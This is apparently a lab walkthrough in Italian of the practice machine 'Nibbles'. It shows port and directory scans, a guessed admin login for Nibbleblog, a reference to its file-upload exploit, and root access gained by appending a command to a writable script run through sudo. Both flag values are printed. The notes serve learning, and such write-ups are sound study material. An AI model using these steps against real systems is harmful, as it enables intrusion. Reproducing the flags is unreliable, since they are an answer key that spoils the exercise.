@@ -1,0 +1,109 @@
+10.10.10.75
+
+masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.75
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 22/tcp on 10.10.10.75                                     
+Discovered open port 80/tcp on 10.10.10.75 
+
+nmap -sC -sV -p22,80 10.10.10.75
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+sulla porta 80 c'è un semplice sito cons critto helloWorld, con view poage source c'è:
+
+<b>Hello world!</b>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
+
+provo a controllare nibbleblog (https://www.nibbleblog.com/it/) e per vedere se ci sonoa nche altre dir che ptorebbero essere utili faccios can con dirb
+
+dirb http://10.10.10.75/
+
+/.htpasswd            (Status: 403) [Size: 295]
+/.htaccess            (Status: 403) [Size: 295]
+
+dirb http://10.10.10.75/nibbleblog/
+
+/.htpasswd            (Status: 403) [Size: 306]
+/.htaccess            (Status: 403) [Size: 306]
+/README               (Status: 200) [Size: 4628]
+/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
+/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
+/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]  
+/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
+
+==== Nibbleblog ======
+Version: v4.0.3
+
+questa versione ha una vulnerabiulity di file update
+
+
+https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/
+
+si può usare direttamente con metasploit
+però richiede username e password dell'admin
+
+http://10.10.10.75/nibbleblog/admin.php
+
+riescoa d accedere indovinando la pwd:
+admin:nibbles
+
+ho quindi una shell coem nibbler:
+
+id
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+
+cat /home/nibbler/user.txt
+d4aa1f1f32b209262195a4812305fbaa
+
+
+sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+
+nella /home/nibbler:
+
+unzip personal.zip -d .
+Archive:  personal.zip
+   creating: ./personal/
+   creating: ./personal/stuff/
+  inflating: ./personal/stuff/monitor.sh 
+
+
+il file monitor.sh è possibile scrivere:
+-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
+
+echo "cat /root/root.txt" >> monitor.sh
+sudo /home/nibbler/personal/stuff/monitor.sh
+972924840555ea662a194c724233987b
+
+
+
+
